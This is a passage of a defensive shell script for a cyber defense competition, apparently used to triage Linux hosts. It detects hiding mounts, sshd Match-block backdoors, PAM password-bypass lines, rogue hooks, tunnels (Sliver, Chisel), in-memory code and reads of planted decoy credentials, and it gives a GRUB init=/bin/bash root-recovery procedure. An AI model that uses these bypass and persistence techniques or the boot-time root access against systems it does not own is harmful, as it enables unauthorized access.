    say "  Check one account: passwd -S <name> (L = locked), chage -l <name> (expired?), grep <name> /etc/passwd (shell nologin?)"
    say ""
    say "  NO way in at all? From the Proxmox console (you control the power):"
    say "    1. Reboot the VM, hold Shift (or tap Esc) for the GRUB menu, press e on the first entry."
    say "    2. At the end of the line starting with 'linux', add:  init=/bin/bash   then press Ctrl+X."
    say "    3. In that root shell: mount -o remount,rw /   then   passwd   (pick one, write it on the sheet)"
    say "    4. Then: exec /sbin/init   (the box boots normally)."
    say "  A box reset costs 60 points (last year): sometimes cheaper than an hour of red services. Ask your lead."
}

sos_fast() {
    say ""
    say "== Check everything fast"
    [ -n "$PTAB" ] || proc_table
    LPORTS=$(listen_ports)
    if [ -f "$BASE" ]; then
        sf_now="$VAULT/.sosnow.$$"
        snapshot > "$sf_now" 2>/dev/null
        sf_gone=$(awk 'NR == FNR {s[$0] = 1; next} /^(RUNNING|LISTEN) / && !($0 in s)' "$sf_now" "$BASE" | head -12)
        rm -f "$sf_now"
        if [ -n "$sf_gone" ]; then say "  Running at the start of the game, but NOT now:"; say "$sf_gone" | sed 's/^/    /'
        else say "  Every service and port from the start of the game is still up."; fi
    fi
    chk_c2; chk_exe; chk_shells; chk_logins; chk_spam; chk_trip
    domain_detect; [ -n "$DOM" ] && chk_domain
    df -P 2>/dev/null | awk 'NR > 1 && $5 + 0 >= 95 {print "  DISK FULL: " $6 " " $5}'
    summary
}

sos_end() {
    say ""
    say "======================================================================"
    say "== Before you go back"
    say "  1. Team notes: the script wrote down its own changes. Anything you did by hand:"
    say "     sh first30.sh note \"what you did\""
    if [ -n "$FACTS" ] && [ "$(grep -c . "$FACTS" 2>/dev/null)" -gt 6 ]; then
        say "  2. Incident facts: $FACTS"
        say "     Your team writes the report from these (AI-written reports score zero). Full facts: menu 21."
    else
        say "  2. Nothing was recorded for an incident report this time."
    fi
    say "  3. Did a password change? File the PCR on the scoring site NOW, or the scored check fails."
    say "  4. Tell your team (paste this into Discord):"
    se_m=$(sed -n '/^----- what happened/,$p' "$FACTS" 2>/dev/null | sed '1d' | cut -c11- | tail -4 | tr '\n' ';' | sed 's/;$//')
    say '     ```'
    say "     [$(date '+%H:%M')] $HOST SOS: ${se_m:-checked, nothing changed}"
    say '     ```'
    say "  5. Open reminders: $(reminders_count)  (menu R)"
    facts_done
    if [ -s "$VAULT/.ontrack" ]; then
        say "  6. BACK ON TRACK: before this you were doing: $(cut -d'|' -f2- "$VAULT/.ontrack")"
    fi
    say "======================================================================"
}

do_sos() {
    need_root
    say "======================================================================"
    say "SOS: something is wrong right now. We take it one step at a time."
    say "Nothing changes on this box unless you type yes."
    say "======================================================================"
    facts_start "SOS on $HOST"
    if [ ! -t 0 ]; then sos_fast; sos_end; return 0; fi
    ask "First: what were you doing before this? (so you get back to it after; Enter to skip)"
    [ -n "$ANS" ] && { printf '%s | %s\n' "$(date '+%H:%M')" "$ANS" > "$VAULT/.ontrack"; chmod 600 "$VAULT/.ontrack"; }
    while :; do
        say ""
        say "What is wrong? Pick the closest one:"
        say "  1  A scored service is down (red on the scoreboard)"
        say "  2  MANY services went red at the same time"
        say "  3  Someone else is on this box (a login, session or connection you do not know)"
        say "  4  A strange program, CPU at 100%, or something calling out"
        say "  5  Accounts or passwords: cannot log in, users locked, deleted or changed (domain too)"
        say "  6  Files changed: website defaced, a config changed, a ransom note"
        say "  7  Terminal spam, or someone watching the screen"
        say "  8  Locked out of SSH or root: why, and how to get back in"
        say "  9  I do not know: check everything fast"
        say "  E  I have an error message: explain it"
        say "  Q  Done"
        ask "Pick one:"
        case "$ANS" in
            1) sos_service ;; 2) sos_many ;; 3) sos_someone ;; 4) sos_program ;; 5) sos_accounts ;;
            6) sos_files ;; 7) chk_spam; yes_ask "Turn on spam protection (quiet)?" && ( do_quiet ) ;;
            8) sos_lockout ;; 9) sos_fast ;; [Ee]) do_why ;; [Qq]|'') break ;;
            *) say "  Pick 1-9, E or Q." ;;
        esac
    done
    sos_end
}

# ======================================================================
# before the game, so these checks look at BEHAVIOR and at places the older
# checks named out loud: settings hidden in sshd Match blocks, clean PAM
# modules used as a bypass, hooks that are not cron or systemd, UDP and
# tunnels, code running from memory, and traps set for this script itself.
# New modes: lock-svc, scrub, decoy, plumbing, fw-restore.
# ======================================================================

# A v5 baseline: saved the first time, kept after that (like the main baseline).
# v5_base NAME  reads the current state on stdin; prints lines that are new or gone.
v5_base() {
    vb_f="$VAULT/v5_${1}_$HOST.txt"
    vb_n="$VAULT/.v5_${1}.$$"
    sort -u > "$vb_n"
    if [ -L "$vb_f" ]; then rm -f "$vb_n"; say "TRAP $vb_f is a link"; return 0; fi
    if [ ! -f "$vb_f" ]; then
        mv "$vb_n" "$vb_f"; chmod 600 "$vb_f"
        return 0
    fi
    comm -13 "$vb_f" "$vb_n" | sed 's/^/NEW  /'
    comm -23 "$vb_f" "$vb_n" | sed 's/^/GONE /'
    rm -f "$vb_n"
}

# ---------------------------------------------------------------- traps set for this script
# Red team knows where the vault is. A link planted inside it would make this
# script write over the file the link points at (for example /etc/shadow).
vault_guard() {
    [ -d "$VAULT" ] || return 0
    vg=$(find "$VAULT" -maxdepth 2 -type l 2>/dev/null | head -20)
    if [ -n "$vg" ]; then
        say "STOP: links were planted inside the vault ($VAULT). Writing through them would overwrite other files:"
        say "$vg" | while read -r vl; do say "  $vl -> $(readlink "$vl" 2>/dev/null)"; done
        say "This is red team. Note it (it is an incident), then remove each link: rm <the link>   and run this again."
        exit 1
    fi
    vg_o=$(stat -c '%u %a' "$VAULT" 2>/dev/null)
    case "$vg_o" in
        '0 700'|'') ;;
        *) chown root "$VAULT" 2>/dev/null; chmod 700 "$VAULT" 2>/dev/null
           say "Note: the vault's owner or permissions were changed ($vg_o). Set back to root, 700." ;;
    esac
    return 0
}

chk_trap() {
    sec trap "Traps for this script: hidden mounts and planted links (T1564, T1574)"
    to=''
    # A mount on top of /proc/<pid> hides that process from ps. A mount on top of a
    # single file under /etc or /usr swaps that file without changing it on disk.
    if [ -r /proc/self/mountinfo ]; then
        tm=$(awk '{mp = $5}
            mp ~ /^\/proc\/[0-9]+/ {print "HIDE mount on top of " mp ": it hides that process from ps (mounted from " $4 ")"; next}
            mp ~ /^\/(etc|bin|sbin|usr|lib|lib64|root|var\/log)\// {print mp}' /proc/self/mountinfo |
            while read -r ml; do
                case "$ml" in "HIDE "*) say "  ${ml#HIDE }"; continue ;; esac
                case "$ml" in /etc/hosts|/etc/hostname|/etc/resolv.conf|/usr/lib/modules|/lib/modules|/usr/lib/firmware|/var/log/journal) continue ;; esac
                case "$ml" in /usr/lib/wsl/*|/usr/share/zoneinfo*) continue ;; esac
                if [ -f "$ml" ]; then say "  a single file is mounted over $ml: what you read is not what is on disk"
                else say "  a folder is mounted over $ml"; fi
            done)
        [ -n "$tm" ] && to="$to
$tm"
    fi
    for tl in /etc/passwd /etc/shadow /etc/group /etc/sudoers /etc/ssh/sshd_config /etc/ld.so.preload /root/.bashrc /root/.bash_history; do
        [ -L "$tl" ] && to="$to
  $tl is a link to $(readlink "$tl"): it should be a normal file"
    done
    if [ -n "$to" ]; then
        say "$to" | sed '/^$/d'
        flag
        nxt "see all mounts: cat /proc/self/mountinfo. Remove a hiding mount with: umount <path>   then look at what it hid. Tell your lead."
    else
        ok "no hiding mounts, and the key files are real files"
    fi
}

# ---------------------------------------------------------------- sshd Match blocks
# sshd -T only shows the settings for "everyone". Settings inside a Match block
# (Match User x, Match Address y) do not show unless you ask for that user and
# address, so a back door can hide there. This reads the files themselves.
ssh_cfg_files() {
    sc_main=$(find_cfg 2>/dev/null) || return 1
    say "$sc_main"
    grep -i -E '^[[:space:]]*Include[[:space:]]' "$sc_main" 2>/dev/null | while read -r _ sc_pat; do
        for sc_p in $sc_pat; do
            case "$sc_p" in /*) ;; *) sc_p="/etc/ssh/$sc_p" ;; esac
            for sc_f in $sc_p; do [ -f "$sc_f" ] && say "$sc_f"; done
        done
    done
}
chk_sshmatch() {
    sec sshmatch "SSH settings hidden inside Match blocks (T1098.004; sshd -T does not show these)"
    sf=$(ssh_cfg_files) || { ok "no sshd on this box"; return 0; }
    # shellcheck disable=SC2086
    sm=$(awk '
        FNR == 1 {inm = 0}
        /^[[:space:]]*(#|$)/ {next}
        {k = tolower($1)}
        k == "match" {inm = ($2 != "" && tolower($2) == "all" && NF == 2) ? 0 : 1; cond = $0; sub(/^[[:space:]]+/, "", cond); next}
        inm && (k == "permitrootlogin" && tolower($2) != "no" ||
                k == "passwordauthentication" && tolower($2) == "yes" ||
                k == "permitemptypasswords" && tolower($2) == "yes" ||
                k == "authorizedkeysfile" || k == "authorizedkeyscommand" || k == "authorizedprincipalsfile" ||
                k == "trustedusercakeys" || k == "forcecommand" || k == "permittunnel" && tolower($2) != "no" ||
                k == "gatewayports" && tolower($2) != "no" || k == "permituserenvironment" && tolower($2) != "no" ||
                k == "authenticationmethods" || k == "kbdinteractiveauthentication" && tolower($2) == "yes" ||
                k == "hostbasedauthentication" && tolower($2) == "yes" || k == "chrootdirectory" ||
                k == "allowusers" || k == "allowgroups" || k == "setenv" || k == "pubkeyauthentication") {
            line = $0; sub(/^[[:space:]]+/, "", line)
            printf "  %s:%d  [%s]  %s\n", FILENAME, FNR, cond, line }' $sf 2>/dev/null)
    sk=$(awk '/^[[:space:]]*(#|$)/ {next} tolower($1) == "authorizedkeysfile" {print "  " FILENAME ":" FNR "  " $0}' $sf 2>/dev/null |
        grep -v -E 'AuthorizedKeysFile[[:space:]]+(\.ssh/authorized_keys|%h/\.ssh/authorized_keys)([[:space:]]+(\.ssh/authorized_keys2|%h/\.ssh/authorized_keys2))?[[:space:]]*$')
    say "  files read: $(say "$sf" | tr '\n' ' ')"
    if [ -n "$sm$sk" ]; then
        [ -n "$sm" ] && { say "  settings that only apply to some users or addresses:"; say "$sm"; }
        [ -n "$sk" ] && { say "  AuthorizedKeysFile is not the normal one (keys are read from another place):"; say "$sk"; }
        flag
        nxt "if your team did not write that block, save the file as evidence and delete the block. Test: sshd -t. See what one user really gets: sshd -T -C user=<name>,host=x,addr=<their address>"
    else
        ok "no risky settings inside Match blocks, and keys are read from the normal place"
    fi
}

# ---------------------------------------------------------------- PAM, round two
# The first PAM check looks for programs and odd modules. This one looks for a
# CLEAN, packaged module used as a bypass (pam_permit, pam_succeed_if, pam_rootok,
# pam_localuser with "sufficient"), and for any PAM line that changed.
chk_pam2() {
    sec pam2 "PAM lines that let a login skip the password, and PAM lines that changed (T1556.003)"
    [ -d /etc/pam.d ] || { ok "no /etc/pam.d on this box"; return 0; }
    p2=$(grep -r -n -E '^[[:space:]]*(auth|account)[[:space:]]' /etc/pam.d 2>/dev/null | awk '
        {
            split($1, a, ":"); f = a[1]; n = split(f, b, "/"); svc = b[n]
            ctl = $2; mod = ""
            for (i = 3; i <= NF; i++) if ($i ~ /pam_[a-z_0-9]+\.so/) { mod = $i; break }
            sub(/^.*\//, "", mod)
            bypass = (ctl == "sufficient" || ctl ~ /success=(done|ok|[0-9]+)/)
            if (mod == "pam_permit.so" && ctl == "sufficient") print "  " $0 "   <- always says yes, and stops there"
            else if (mod == "pam_succeed_if.so" && ctl == "sufficient") print "  " $0 "   <- a condition replaces the password"
            else if (mod == "pam_localuser.so" && ctl == "sufficient") print "  " $0 "   <- every local account passes"
            else if (mod == "pam_listfile.so" && bypass) print "  " $0 "   <- names in a file pass without a password"
            else if (mod == "pam_rootok.so" && bypass && svc !~ /^(su|su-l|runuser|runuser-l|chsh|chfn|groupmems|chage|newusers|chpasswd|useradd|usermod|userdel|groupadd|groupdel|groupmod|vipw|shadow|setup|system-config.*|config-util|kbdrate|halt|poweroff|reboot|run_init|newrole|xserver|subscription-manager.*|pkexec|polkit-1|passwd|chgpasswd)$/)
                print "  " $0 "   <- root needs no password for this service"
        }' | head -20)
    p2d=$(grep -r -H -v -E '^[[:space:]]*(#|$)' /etc/pam.d 2>/dev/null | sed 's/[[:space:]][[:space:]]*/ /g' | v5_base pam | head -30)
    if [ -n "$p2$p2d" ]; then
        [ -n "$p2" ] && { say "  lines that skip the password:"; say "$p2"; }
        [ -n "$p2d" ] && { say "  PAM lines that changed since this script's first run here:"; say "$p2d" | sed 's/^/    /'; }
        flag
        nxt "PAM runs top to bottom. A 'sufficient' line that passes ends the check. If your team did not add it: copy the file to evidence, remove the line, and test a NEW login before you close this one."
    else
        ok "no password-skipping lines, and nothing changed"
    fi
    if grep -r -q -E 'pam_unix\.so.*nullok' /etc/pam.d 2>/dev/null && [ -r /etc/shadow ] && [ -n "$(awk -F: '$2 == ""' /etc/shadow)" ]; then
        say "  note: PAM allows empty passwords (nullok) AND an account has none: see the accounts check."
    fi
}

# ---------------------------------------------------------------- hooks that are not cron
# Places that run a program on an event: a device appears, the network comes up,
# a package installs, someone logs in, git pulls. None of them is cron or a service.
HOOK_DIRS='/etc/udev/rules.d /etc/systemd/system-generators /etc/systemd/user-generators
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators /usr/lib/systemd/user-generators
/lib/systemd/system-generators /etc/NetworkManager/dispatcher.d /etc/network/if-up.d /etc/network/if-pre-up.d
/etc/network/if-down.d /etc/network/if-post-down.d /etc/apt/apt.conf.d /etc/dnf/plugins /etc/yum/pluginconf.d
/etc/dnf/plugins/post-transaction-actions.d /etc/update-motd.d /etc/logrotate.d /etc/dhcp/dhclient-exit-hooks.d
/etc/dhcp/dhclient-enter-hooks.d /etc/ppp/ip-up.d /etc/X11/Xsession.d /etc/xdg/autostart /etc/kernel/postinst.d
/etc/initramfs-tools/hooks /etc/modules-load.d /etc/modprobe.d /etc/pm/sleep.d /usr/lib/systemd/system-sleep
/etc/bash_completion.d /etc/sysctl.d /etc/binfmt.d /etc/tmpfiles.d'
hook_files() {
    for hd in $HOOK_DIRS; do
        [ -d "$hd" ] && find "$hd" -maxdepth 2 \( -type f -o -type l \) 2>/dev/null
    done
    for hd in /root /home /opt /srv /var/www /usr/local /etc; do
        [ -d "$hd" ] && find "$hd" -maxdepth 6 -type f -path '*/.git/hooks/*' ! -name '*.sample' 2>/dev/null
    done
}
chk_hooks() {
    sec hooks "Hooks that run a program on an event: udev, generators, network, package, motd, git (T1546, T1547)"
    hl="$VAULT/.hooks.$$"
    hook_files | sort -u > "$hl"
    ho=''
    while read -r hf; do
        [ -n "$hf" ] || continue
        hw=''
        case "$hf" in
            */udev/rules.d/*) grep -q -E 'RUN\+?=|PROGRAM=|IMPORT\{program\}' "$hf" 2>/dev/null && hw='runs a program when a device appears' ;;
            */apt.conf.d/*) grep -q -i -E '(Pre|Post)-Invoke|Pre-Install-Pkgs' "$hf" 2>/dev/null && hw='runs a command every time apt or dpkg runs' ;;
            */logrotate.d/*) grep -q -E '^[[:space:]]*(post|pre|first|last)rotate|^[[:space:]]*(firstaction|lastaction)' "$hf" 2>/dev/null && hw='runs a command when logs rotate (as root)' ;;
            */modprobe.d/*) grep -q -E '^[[:space:]]*install[[:space:]]' "$hf" 2>/dev/null && hw='runs a command when a kernel module loads' ;;
            */tmpfiles.d/*|*/sysctl.d/*|*/modules-load.d/*|*/binfmt.d/*|*/bash_completion.d/*|*/pluginconf.d/*|*/dnf/plugins/*.conf) hw='' ;;
            */.git/hooks/*) hw='runs when someone uses git in that folder' ;;
            *) hw='runs on its event (boot, network change, login, package install)' ;;
        esac
        [ -n "$hw" ] || continue
        from_package "$hf"
        [ $? = 1 ] || continue
        ho="$ho
  $hf: no package installed it; it $hw"
    done < "$hl"
    hd=$(while read -r hf; do [ -f "$hf" ] && sha256sum "$hf" 2>/dev/null; done < "$hl" | awk '{print $2, substr($1, 1, 12)}' | v5_base hooks | head -30)
    rm -f "$hl"
    if [ -n "$ho$hd" ]; then
        [ -n "$ho" ] && say "$ho" | sed '/^$/d' | head -40
        [ -n "$hd" ] && { say "  hook files that are new, gone or changed since this script's first run here:"; say "$hd" | sed 's/^/    /'; }
        flag
        nxt "read each file. Your own team's hooks are fine (note them). Anything else: sh first30.sh evidence <file>, then remove it."
    else
        ok "every hook file came from a package, and none changed"
    fi
}

# ---------------------------------------------------------------- UDP, tunnels, local forwards
# The connection checks above watch TCP. Sliver, WireGuard, Ligolo and Chisel can
# use UDP, a tunnel device, or a port forward through SSH or localhost.
chk_udp() {
    sec udp "UDP, tunnels and port forwards (T1572, T1090, T1095)"
    uo=''
    if have ss; then
        uu=$(ss -H -uanp 2>/dev/null | awk '{print $1, $4, $5, $NF}' | while read -r ust ulocal upeer uown; do
            upid=$(printf '%s\n' "$uown" | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p')
            uprog=$(printf '%s\n' "$uown" | sed -n 's/.*(("\([^"]*\)".*/\1/p')
            [ -n "$upid" ] || continue
            uexe=$(readlink "/proc/$upid/exe" 2>/dev/null)
            [ -n "$uexe" ] || continue
            uwhy=''
            case "$uexe" in *' (deleted)') uwhy="$uwhy program-deleted" ;; /tmp/*|/var/tmp/*|/dev/shm/*|*/.*) uwhy="$uwhy hidden-or-temp-path" ;; esac
            from_package "${uexe% (deleted)}"; [ $? = 1 ] && uwhy="$uwhy not-from-a-package"
            case "$upeer" in '*:*'|'0.0.0.0:*'|'[::]:*'|'') ;; *)
                upip=${upeer%:*}; upip=${upip#\[}; upip=${upip%\]}
                case "$upip" in 127.*|::1) ;; *) outside_nets "$upip" && uwhy="$uwhy talks-to-outside:$upeer" ;; esac ;;
            esac
            [ -n "$uwhy" ] && printf '  UDP %-22s %-14s pid %-7s %s  %s\n' "$ulocal" "${uprog:--}" "$upid" "$uexe" "$uwhy"
        done | sort -u | head -15)
        [ -n "$uu" ] && uo="$uo
$uu"
        # sshd listening on a port that is not its own = a remote forward (ssh -R)
        us=$(ss -H -tlnp 2>/dev/null | grep -E '"sshd"' | awk '{print $4}' | sed 's/.*://' | sort -u | tr '\n' ' ')
        up=$( (find_sshd >/dev/null 2>&1 && "$(find_sshd)" -T 2>/dev/null | awk '$1 == "port" {print $2}') | tr '\n' ' ')
        [ -n "$up" ] || up='22 '
        for uq in $us; do
            case " $up " in *" $uq "*) ;; *) uo="$uo
  sshd is listening on port $uq, which is not its own port: someone opened a forward through SSH (ssh -R)" ;; esac
        done
        # programs no package installed that listen only on this box (a local proxy end)
        ul=$(ss -H -tlnp 2>/dev/null | awk '$4 ~ /^(127\.|\[::1\])/ {print $4, $NF}' | while read -r uaddr uown; do
            upid=$(printf '%s\n' "$uown" | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p')
            [ -n "$upid" ] || continue
            uexe=$(readlink "/proc/$upid/exe" 2>/dev/null); [ -n "$uexe" ] || continue
            from_package "${uexe% (deleted)}"
            [ $? = 1 ] && say "  $uexe (pid $upid) listens on $uaddr only, and no package installed it: a local proxy or forwarder?"
        done | sort -u | head -10)
        [ -n "$ul" ] && uo="$uo
$ul"
    fi
    # ssh clients started with a forward or a tunnel
    ut=$(for up_d in /proc/[0-9]*; do
            [ "$(cat "$up_d/comm" 2>/dev/null)" = ssh ] || continue
            uc=$(tr '\0' ' ' < "$up_d/cmdline" 2>/dev/null)
            case " $uc" in *' -R'*|*' -L'*|*' -D'*|*' -w'*|*'RemoteForward'*|*'DynamicForward'*|*'LocalForward'*|*'Tunnel='*)
                say "  pid ${up_d#/proc/} ($(ps -o user= -p "${up_d#/proc/}" 2>/dev/null | tr -d ' ')): $(printf '%s' "$uc" | cut -c1-140)" ;; esac
        done)
    [ -n "$ut" ] && uo="$uo
  ssh clients carrying a forward or tunnel out of this box:
$ut"
    # tunnel devices
    if have ip; then
        ui=$(ip -d -o link show 2>/dev/null | awk '{
            t = ""; if ($0 ~ / wireguard /) t = "wireguard"; else if ($0 ~ / tun /) t = "tun/tap"; else if ($0 ~ / (gre|gretap|ipip|sit|vxlan|geneve|ip6tnl|vti) /) t = "tunnel"
            if (t != "") { n = $2; sub(/:$/, "", n); sub(/@.*/, "", n); print n " (" t ")" } }' |
            grep -v -E '^(flannel|cni|cilium|calico|vxlan\.calico|docker|tailscale|kube|weave)' | tr '\n' ' ')
        if [ -n "$ui" ]; then
            ud=$(printf '%s\n' "$ui" | tr ' ' '\n' | sed '/^$/d' | v5_base tunnels)
            if [ -n "$ud" ]; then uo="$uo
  tunnel devices new since this script's first run here: $(say "$ud" | tr '\n' ' ')"; fi
            say "  tunnel devices now: $ui"
        fi
    fi
    if [ -n "$uo" ]; then
        say "$uo" | sed '/^$/d'
        flag
        nxt "a VPN your team runs is fine (note it). Otherwise: sh first30.sh evidence <program>, then sh first30.sh kick <pid or address>. See a device: ip -d link show <name>"
    else
        ok "no odd UDP programs, no forwards through SSH, no new tunnel devices"
    fi
}

# ---------------------------------------------------------------- code running from memory
chk_mem() {
    sec mem "Programs running from memory instead of a file (T1620, T1055)"
    mo=''
    for mp in /proc/[0-9]*; do
        mpid=${mp#/proc/}
        mexe=$(readlink "$mp/exe" 2>/dev/null) || continue
        [ -n "$mexe" ] || continue
        mw=''
        case "$mexe" in
            /memfd:*|*'memfd:'*) mw='runs from memory only (memfd): there is no file on disk' ;;
            /dev/shm/*|/run/shm/*) mw='runs from /dev/shm (memory-backed)' ;;
        esac
        if [ -z "$mw" ] && [ -r "$mp/maps" ]; then
            mcomm=$(cat "$mp/comm" 2>/dev/null)
            case "$mcomm" in
                java|node|nodejs|qemu*|mono*|dotnet|ruby*|luajit|firefox*|chrome*|chromium*|php*|pypy*|gjs|gnome-shell|Xorg|Web\ Content|WebKit*|julia|erl|beam*|deno|bun|code|electron|containerd*|dockerd|mongod|mysqld|mariadbd|postgres|systemd*|v8*|wasmtime) ;;
                *)
                    mrwx=$(awk '$2 ~ /^rwx/ && ($6 == "" || $6 ~ /^\[(heap|stack)/ || $6 ~ /memfd:/ || $6 ~ /\(deleted\)/) {n++} END {print n + 0}' "$mp/maps" 2>/dev/null)
                    if [ "${mrwx:-0}" -gt 0 ]; then
                        from_package "${mexe% (deleted)}"
                        [ $? = 1 ] && mw="has $mrwx writable+runnable memory areas with no file behind them, and no package installed it (injected code?)"
                    fi ;;
            esac
        fi
        if [ -z "$mw" ] && ls -l "$mp/fd" 2>/dev/null | grep -q 'io_uring'; then
            from_package "${mexe% (deleted)}"
            [ $? = 1 ] && mw='uses io_uring (file and network work that auditd syscall rules do not see), and no package installed it'
        fi
        [ -n "$mw" ] || continue
        mo="$mo
  pid $mpid ($(ps -o user= -p "$mpid" 2>/dev/null | tr -d ' ')) $(cat "$mp/comm" 2>/dev/null): $mw
      program: $mexe   started by pid $(awk '{print $4}' "$mp/stat" 2>/dev/null)"
    done
    if [ -n "$mo" ]; then
        say "$mo" | sed '/^$/d' | head -30
        flag
        nxt "save it BEFORE you stop it, because it only exists in memory: sh first30.sh evidence /proc/<pid>/exe   then: sh first30.sh kick <pid>. Then find what started it (the 'started by' pid)."
    else
        ok "every program runs from a real file"
    fi
}

# ---------------------------------------------------------------- decoys (more bait)
# Extra bait files. Each run notes when every decoy was last READ. Nothing on this
# box should ever read them, so a newer read time means someone went looking.
# This needs no auditd, so it still works after the audit rules are locked.
DECOYS="$VAULT/decoys.txt"
decoy_atime() { stat -c '%X' "$1" 2>/dev/null; }
decoy_rearm() {
    [ -s "$DECOYS" ] || return 0
    dr_n="$DECOYS.new.$$"
    while read -r dr_p dr_u _; do
        [ -n "$dr_p" ] || continue
        printf '%s %s %s\n' "$dr_p" "$dr_u" "$(decoy_atime "$dr_p")"
    done < "$DECOYS" > "$dr_n"
    mv "$dr_n" "$DECOYS"; chmod 600 "$DECOYS"
}
# Who touched a file, from the audit log: time, account, program, the process that
# started it, and the address that login session came from.
bait_hits() {   # bait_hits KEY
    have ausearch || return 0
    ausearch -k "$1" -i 2>/dev/null | awk '
        /^type=SYSCALL/ && !/_rule/ {
            t = ""; if (match($0, /msg=audit\([^)]*\)/)) t = substr($0, RSTART + 10, RLENGTH - 11)
            o = "    " t
            n = split($0, w, " ")
            for (i = 1; i <= n; i++) if (w[i] ~ /^(pid|ppid|auid|uid|ses|comm|exe)=/) o = o "  " w[i]
            print o }' | tail -8
    for bh_s in $(ausearch -k "$1" -i 2>/dev/null | sed -n 's/.* ses=\([0-9][0-9]*\) .*/\1/p' | sort -u | tail -5); do
        bh_a=$(ausearch --session "$bh_s" -m USER_LOGIN,USER_START,CRED_ACQ -i 2>/dev/null | sed -n 's/.*addr=\([^ ]*\).*/\1/p' | grep -v '^?$' | sort -u | tr '\n' ' ')
        [ -n "$bh_a" ] && say "    login session $bh_s came from: $bh_a"
    done
}
chk_decoy() {
    [ -s "$DECOYS" ] || return 0
    sec decoy "Your decoy files (T1552.001, T1083: someone is searching this box for passwords)"
    do_o=''
    while read -r dc_p dc_u dc_a; do
        [ -n "$dc_p" ] || continue
        if [ ! -e "$dc_p" ]; then do_o="$do_o
  $dc_p is GONE: someone deleted or moved it"; continue; fi
        dc_n=$(decoy_atime "$dc_p")
        if [ -n "$dc_a" ] && [ -n "$dc_n" ] && [ "$dc_n" -gt "$dc_a" ]; then
            do_o="$do_o
  $dc_p was READ at $(date -d "@$dc_n" '+%Y-%m-%d %H:%M:%S' 2>/dev/null || echo "epoch $dc_n") (this box's clock)"
        fi
        if [ -n "$dc_u" ] && [ "$dc_u" != - ]; then
            dc_l=$(auth_log | grep -F -w -- "$dc_u" | tail -3)
            [ -n "$dc_l" ] && do_o="$do_o
  someone tried the made-up login name $dc_u from that decoy:
$(say "$dc_l" | sed 's/^/      /')"
        fi
    done < "$DECOYS"
    dc_h=$(bait_hits decoy)
    [ -n "$dc_h" ] && do_o="$do_o
  the audit log shows who (newest last):
$dc_h"
    if [ -n "$do_o" ]; then
        say "$do_o" | sed '/^$/d'
        flag
        nxt "this is red team (or a teammate: ask first). The read time, the program and the address are your incident facts: sh first30.sh facts. Then hunt for how they got in."
    else
        ok "nobody has read a decoy ($(grep -c . "$DECOYS") planted)"
    fi
}
do_decoy() {
    need_root
    dp=$1 dk=${2:-login}
    if [ -z "$dp" ]; then
        say "== Decoys (extra bait files; you can plant several)"
        if [ -s "$DECOYS" ]; then awk '{print "  " $1 "   (made-up login: " $2 ")"}' "$DECOYS"; else say "  None planted."; fi
        say "  Plant one:  sh first30.sh decoy <full path> [login|admin]"
        say "    login = an old service login file.   admin = a fake remote-admin tool config."
        say "  Pick names only your team knows. Good places: /opt/<app>/, /srv/, /var/backups/, a home folder."
        why "red team's scripts grep for 'password' and read anything that looks like credentials. The decoy costs them time and tells you they are here."
        return 0
    fi
    case "$dp" in
        /root/*|/home/*|/opt/*|/srv/*|/var/backups/*) ;;
        *) say "Put the decoy under /root, /home, /opt, /srv or /var/backups (this script reads /etc and /tmp itself)."; return 1 ;;
    esac
    case "$dp" in "$VAULT"/*|*/.ssh/*) say "Not inside the vault or an .ssh folder. Pick another place."; return 1 ;; esac
    if [ -e "$dp" ] || [ -L "$dp" ]; then say "$dp already exists. Pick a new file name."; return 1; fi
    if [ ! -d "$(dirname "$dp")" ]; then say "The folder $(dirname "$dp") does not exist."; return 1; fi
    if [ "$(grep -c . "$DECOYS" 2>/dev/null || echo 0)" -ge 12 ]; then say "12 decoys are planted already. That is plenty."; return 1; fi
    dn=$(( ($(date +%s) + $(grep -c . "$DECOYS" 2>/dev/null || echo 0) * 7) % 90 + 10 ))
    for dw in archive mirror relay batch ingest; do
        du="svc_$dw$dn"
        grep -q "^$du:" /etc/passwd || break
    done
    dpw=$(od -An -tx1 -N 9 /dev/urandom 2>/dev/null | tr -d ' \n')
    case "$dk" in
        admin)
            {
                say "# remote admin agent - legacy config, kept for rollback"
                say "[server]"
                say "listen = 127.0.0.1:8443"
                say "operator = $du"
                say "auth_token = ${dpw:-7f3a91c2d4e5b6a7c8}"
                say "# callback disabled by ops, see ticket in wiki"
            } > "$dp" ;;
        *)
            {
                say "# service login for the nightly job - rotated, old value kept until cutover"
                say "host=$HOST"
                say "user=$du"
                say "password=${dpw:-Autumn2026!x}"
            } > "$dp" ;;
    esac
    chmod 644 "$dp"
    printf '%s %s %s\n' "$dp" "$du" "$(decoy_atime "$dp")" >> "$DECOYS"
    chmod 600 "$DECOYS"
    autonote "planted a decoy (list in $DECOYS)"
    say "Decoy planted: $dp   (made-up login name inside: $du)"
    if have auditctl && audit_running && [ "$(audit_enabled)" != 2 ]; then
        auditctl -w "$dp" -p rwa -k decoy >/dev/null 2>&1 && say "auditd now logs who opens it (key: decoy). Run sh first30.sh auditd to keep that rule after a reboot."
    else
        say "The hunt checks its read time every run. That works without auditd."
    fi
    say "Never open it yourself (cat, less, grep in that folder): that counts as a read."
}

# ---------------------------------------------------------------- shared plumbing
# Find what will BREAK if you change a password, before you change it.
chk_plumbing() {
    sec plumbing "Shared plumbing: read this BEFORE you change any password"
    po=''
    decoy_paths
    if pgrep -x vault >/dev/null 2>&1 || pgrep -f 'vault[ -]agent' >/dev/null 2>&1 || [ -d /etc/vault.d ] || [ -d /etc/vault-agent.d ]; then
        po="$po
  HashiCorp Vault is here ($(pgrep -a -f 'vault' 2>/dev/null | head -2 | cut -c1-90 | tr '\n' ';')).
    If vault-agent hands out database passwords, do NOT reset those passwords by hand: Vault changes them back
    or the app keeps the old one. Restart the agent instead: systemctl restart vault-agent   (then check the app)."
    fi
    if pgrep -f -i keycloak >/dev/null 2>&1 || [ -d /opt/keycloak ]; then
        po="$po
  Keycloak (single sign-on) is here. It logs in to AD/LDAP with its own bind account. If that account's password
    changes on the DC, every login through Keycloak fails with LDAP error 52e until you update it in Keycloak
    (User federation -> the LDAP provider -> Bind credentials)."
    fi
    pl=$(for pd in /etc /opt /srv /var/www /usr/local/etc /home; do
            [ -d "$pd" ] && find "$pd" -maxdepth 5 -type f -size -512k \
                \( -name '*.conf' -o -name '*.cnf' -o -name '*.ini' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' \
